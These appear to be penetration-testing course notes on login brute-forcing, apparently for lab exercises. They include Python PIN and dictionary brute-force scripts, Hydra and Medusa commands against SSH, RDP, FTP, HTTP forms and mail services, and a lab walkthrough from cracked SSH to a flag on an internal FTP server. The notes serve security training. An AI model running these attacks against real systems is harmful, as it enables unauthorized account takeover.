# Brute Force Attacks

## 1.Brute Force Attacks

### Cracking the PIN

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

> The Python script systematically iterates all possible 4-digit PINs (0000 to 9999) and sends GET requests to the Flask endpoint with each PIN. It checks the response status code and content to identify the correct PIN and capture the associated flag.

```shell-session
python pin-solver.py
```

## 2.Dictionary Attacks

> <https://github.com/danielmiessler/SecLists/tree/master/Passwords>
>
> \
> Here is a table of some of the more useful wordlists for login brute-forcing:

| Wordlist                                    | Description                                                                                      | Typical Use                                        | Source                                                                                                                           |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------ | -------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `rockyou.txt`                               | A popular password wordlist containing millions of passwords leaked from the RockYou breach.     | Commonly used for password brute force attacks.    | [RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)                      |
| `top-usernames-shortlist.txt`               | A concise list of the most common usernames.                                                     | Suitable for quick brute force username attempts.  | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)                         |
| `xato-net-10-million-usernames.txt`         | A more extensive list of 10 million usernames.                                                   | Used for thorough username brute forcing.          | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)                   |
| `2023-200_most_used_passwords.txt`          | A list of the 200 most commonly used passwords as of 2023.                                       | Effective for targeting commonly reused passwords. | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) |
| `Default-Credentials/default-passwords.txt` | A list of default usernames and passwords commonly used in routers, software, and other devices. | Ideal for trying default credentials.              | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)           |

### Throwing a dictionary at the problem

dictionary-solver.py

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

```shell-session
python3 dictionary-solver.py
```

## 3.Hybrid Attacks

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FlHbQ0ejQtaUfcUZSaMpV%2Fimage.png?alt=media&amp;token=cb76484c-bcae-449c-9e19-994a49bdd9c9" alt=""><figcaption></figcaption></figure>

> <https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt>

```shell-session
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
```

> Next, we need to start matching that wordlist to the password policy.

> This initial grep command targets the core policy requirement of a minimum password length of 8 characters. The regular expression ^.{8,}$ acts as a filter, ensuring that only passwords containing at least 8 characters are passed through and saved in a temporary file named darkweb2017-minlength.txt.

```shell-session
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
```

```shell-session
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```

> Building upon the previous filter, this `grep` command enforces the policy's demand for at least one uppercase letter. The regular expression `[A-Z]` ensures that any password lacking an uppercase letter is discarded, further refining the list saved in `darkweb2017-uppercase.txt`.

```shell-session
grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```

> Maintaining the filtering chain, this `grep` command ensures compliance with the policy's requirement for at least one lowercase letter. The regular expression `[a-z]` serves as the filter, keeping only passwords that include at least one lowercase letter and storing them in `darkweb2017-lowercase.txt`.

```shell-session
grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```

> This last `grep` command tackles the policy's numerical requirement. The regular expression `[0-9]` acts as a filter, ensuring that passwords containing at least one numerical digit are preserved in `darkweb2017-number.txt`.

```shell-session
wc -l darkweb2017-number.txt
```


    ---



# Hydra - Medusa

## 1.Hydra

```shell-session
hydra -h

sudo apt-get -y update
sudo apt-get -y install hydra
```

```shell-session
hydra [login_options] [password_options] [attack_options] [service_options]
```

| Parameter               | Explanation                                                                                                | Usage Example                                                                                                   |
| ----------------------- | ---------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| `-l LOGIN` or `-L FILE` | Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`).    | `hydra -l admin ...` or `hydra -L usernames.txt ...`                                                            |
| `-p PASS` or `-P FILE`  | Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`). | `hydra -p password123 ...` or `hydra -P passwords.txt ...`                                                      |
| `-t TASKS`              | Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.           | `hydra -t 4 ...`                                                                                                |
| `-f`                    | Fast mode: Stop the attack after the first successful login is found.                                      | `hydra -f ...`                                                                                                  |
| `-s PORT`               | Port: Specify a non-default port for the target service.                                                   | `hydra -s 2222 ...`                                                                                             |
| `-v` or `-V`            | Verbose output: Display detailed information about the attack's progress, including attempts and results.  | `hydra -v ...` or `hydra -V ...` (for even more verbosity)                                                      |
| `service://server`      | Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname.      | `hydra ssh://192.168.1.100`                                                                                     |
| `/OPT`                  | Service-specific options: Provide any additional options required by the target service.                   | `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication) |

## Hydra Services

> Hydra services essentially define the specific protocols or services that Hydra can target. They enable Hydra to interact with different authentication mechanisms used by various systems, applications, and network services. Each module is designed to understand a particular protocol's communication patterns and authentication requirements, allowing Hydra to send appropriate login requests and interpret the responses. Below is a table of commonly used services:

| Hydra Service | Service/Protocol                 | Description                                                                                             | Example Command                                                                                                |
| ------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| ftp           | File Transfer Protocol (FTP)     | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                             |
| ssh           | Secure Shell (SSH)               | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.      | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                              |
| http-get/post | HTTP Web Services                | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.       | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp          | Simple Mail Transfer Protocol    | Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.        | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                          |
| pop3          | Post Office Protocol (POP3)      | Targets email retrieval services to brute-force credentials for POP3 login.                             | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                               |
| imap          | Internet Message Access Protocol | Used to brute-force credentials for IMAP services, which allow users to access their email remotely.    | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                               |
| mysql         | MySQL Database                   | Attempts to brute-force login credentials for MySQL databases.                                          | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`                                            |
| mssql         | Microsoft SQL Server             | Targets Microsoft SQL servers to brute-force database login credentials.                                | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                              |
| vnc           | Virtual Network Computing (VNC)  | Brute-forces VNC services, used for remote desktop access.                                              | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                      |
| rdp           | Remote Desktop Protocol (RDP)    | Targets Microsoft RDP services for remote login brute-forcing.                                          | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                             |

## Brute-Forcing HTTP Authentication

> This command instructs Hydra to:
>
> * Use the list of usernames from the `usernames.txt` file.
> * Use the list of passwords from the `passwords.txt` file.
> * Target the website `www.example.com`.
> * Employ the `http-get` module to test the HTTP authentication.
>
> Hydra will systematically try each username-password combination against the target website to discover a valid login.

```shell-session
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

### Targeting Multiple SSH Servers

> This command instructs Hydra to:
>
> * Use the username "root".
> * Use the password "toor".
> * Target all IP addresses listed in the `targets.txt` file.
> * Employ the `ssh` module for the attack.
>
> Hydra will execute parallel brute-force attempts on each server, significantly speeding up the process.

```shell-session
hydra -l root -p toor -M targets.txt ssh
```

### Testing FTP Credentials on a Non-Standard Port

> This command instructs Hydra to:
>
> * Use the list of usernames from the `usernames.txt` file.
> * Use the list of passwords from the `passwords.txt` file.
> * Target the FTP service on `ftp.example.com` via port `2121`.
> * Use the `ftp` module and provide verbose output (`-V`) for detailed monitoring.
>
> Hydra will attempt to match each username-password combination against the FTP server on the specified port.

```shell-session
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

## Brute-Forcing a Web Login Form

> Suppose you are tasked with brute-forcing a login form on a web application at `www.example.com`. You know the username is "admin," and the form parameters for the login are `user=^USER^&pass=^PASS^`. To perform this attack, use the following Hydra command:

> This command instructs Hydra to:
>
> * Use the username "admin".
> * Use the list of passwords from the `passwords.txt` file.
> * Target the login form at `/login` on `www.example.com`.
> * Employ the `http-post-form` module with the specified form parameters.
> * Look for a successful login indicated by the HTTP status code `302`.
>
> Hydra will systematically attempt each password for the "admin" account, checking for the specified success condition.

```shell-session
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

## Advanced RDP Brute-Forcing

> Now, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP `192.168.1.100`. You suspect the username is "administrator," and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers. To carry out this precise attack,

> This command instructs Hydra to:
>
> * Use the username "administrator".
> * Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
> * Target the RDP service on `192.168.1.100`.
> * Employ the `rdp` module for the attack.
>
> Hydra will generate and test all possible password combinations within the specified parameters, attempting to break into the RDP service.

```shell-session
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

## 2.Basic HTTP Authentication

For example, the headers for Basic Auth in a HTTP GET request would look like:

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

## Exploiting Basic Auth with Hydra

```shell-session
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt

hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

## 3.Login Forms

### A Basic Login Form Example

```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>
```

> This form, when submitted, sends a POST request to the `/login` endpoint on the server, including the entered username and password as form data.

```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

> When a user interacts with a login form, their browser handles the initial processing. The browser captures the entered credentials, often employing JavaScript for client-side validation or input sanitization. Upon submission, the browser constructs an HTTP POST request. This request encapsulates the form data—including the username and password—within its body, often encoded as `application/x-www-form-urlencoded` or `multipart/form-data`.

### http-post-form

```shell-session
hydra [options] target http-post-form "path:params:condition_string"
```

## Understanding the Condition String

<pre class="language-bash"><code class="lang-bash">hydra ... http-post-form "/login:user=^USER^&#x26;pass=^PASS^:F=Invalid credentials"

hydra ... http-post-form "/login:user=^USER^&#x26;pass=^PASS^:S=302"
<strong>
</strong><strong># HTTP 302 status code as a successful login
</strong>hydra ... http-post-form "/login:user=^USER^&#x26;pass=^PASS^:S=Dashboard"
</code></pre>

## Manual Inspection

```html
<form method="POST">
    <h2>Login</h2>
    <label for="username">Username:</label>
    <input type="text" id="username" name="username">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password">
    <input type="submit" value="Login">
</form>
```

> The HTML reveals a simple login form. Key points for Hydra:
>
> * `Method`: `POST` - Hydra will need to send POST requests to the server.
> * Fields:
>   * `Username`: The input field named `username` will be targeted.
>   * `Password`: The input field named `password` will be targeted.
>
> With these details, you can construct the Hydra command to automate the brute-force attack against this login form.

## Browser Developer Tools

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FblTTlwkZRnMVEquWxo8d%2Fimage.png?alt=media&amp;token=ef9fa06d-bc93-4aef-bcfb-6ff258629b64" alt=""><figcaption></figcaption></figure>

## Proxy Interception

### Constructing the params String for Hydra

> We will be using [top-usernames-shortlist.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt) for the username list, and [2023-200\_most\_used\_passwords.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) for the password list.

```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

```shell-session
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## 4.Medusa

> Medusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. Its primary objective is to support a wide array of services that allow remote authentication, enabling penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.

```shell-session
sudo apt-get -y update
sudo apt-get -y install medusa
```

## Command Syntax and Parameter Table

```shell-session
 medusa [target_options] [credential_options] -M module [module_options]
```

| Parameter                  | Explanation                                                                                                                              | Usage Example                                                                                                                                                      |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `-h HOST` or `-H FILE`     | Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`).              | `medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...`                                                                                                        |
| `-u USERNAME` or `-U FILE` | Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`).                               | `medusa -u admin ...` or `medusa -U usernames.txt ...`                                                                                                             |
| `-p PASSWORD` or `-P FILE` | Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`).                               | `medusa -p password123 ...` or `medusa -P passwords.txt ...`                                                                                                       |
| `-M MODULE`                | Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`).                                                   | `medusa -M ssh ...`                                                                                                                                                |
| `-m "MODULE_OPTION"`       | Module options: Provide additional parameters required by the chosen module, enclosed in quotes.                                         | `medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...` |
| `-t TASKS`                 | Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.                                          | `medusa -t 4 ...`                                                                                                                                                  |
| `-f` or `-F`               | Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`).              | `medusa -f ...` or `medusa -F ...`                                                                                                                                 |
| `-n PORT`                  | Port: Specify a non-default port for the target service.                                                                                 | `medusa -n 2222 ...`                                                                                                                                               |
| `-v LEVEL`                 | Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output. | `medusa -v 4 ...`                                                                                                                                                  |

### Medusa Modules

> Each module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks. Below is a table of commonly used modules:

| Medusa Module    | Service/Protocol                 | Description                                                                                 | Usage Example                                                                                                               |
| ---------------- | -------------------------------- | ------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| FTP              | File Transfer Protocol           | Brute-forcing FTP login credentials, used for file transfers over a network.                | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| HTTP             | Hypertext Transfer Protocol      | Brute-forcing login forms on web applications over HTTP (GET/POST).                         | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |
| IMAP             | Internet Message Access Protocol | Brute-forcing IMAP logins, often used to access email servers.                              | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| MySQL            | MySQL Database                   | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`                                                                 |
| POP3             | Post Office Protocol 3           | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.            | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`                                                          |
| RDP              | Remote Desktop Protocol          | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.       | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| SSHv2            | Secure Shell (SSH)               | Brute-forcing SSH logins, commonly used for secure remote access.                           | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`                                                                   |
| Subversion (SVN) | Version Control System           | Brute-forcing Subversion (SVN) repositories for version control.                            | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |
| Telnet           | Telnet Protocol                  | Brute-forcing Telnet services for remote command execution on older systems.                | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`                                                               |
| VNC              | Virtual Network Computing        | Brute-forcing VNC login credentials for remote desktop access.                              | `medusa -M vnc -h 192.168.1.100 -P passwords.txt`                                                                           |
| Web Form         | Brute-forcing Web Login Forms    | Brute-forcing login forms on websites using HTTP POST requests.                             | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`   |

## Targeting an SSH Server

```shell-session
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```

## Targeting Multiple Web Servers with Basic HTTP Authentication

```shell-session
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

## Testing for Empty or Default Passwords

```shell-session
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

## 6.Web Services

```shell-session
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

### Gaining Access

```shell-session
ssh sshuser@<IP> -p PORT
```

### Expanding the Attack Surface

```shell-session
netstat -tulpn | grep LISTEN
```

Further reconnaissance with `nmap` (within the SSH session) confirms this finding as an ftp server.

```shell-session
nmap localhost
```

### Targeting the FTP Server

```shell-session
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

### Retrieving The Flag

```shell-session
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
cat flag.txt
```

<br>
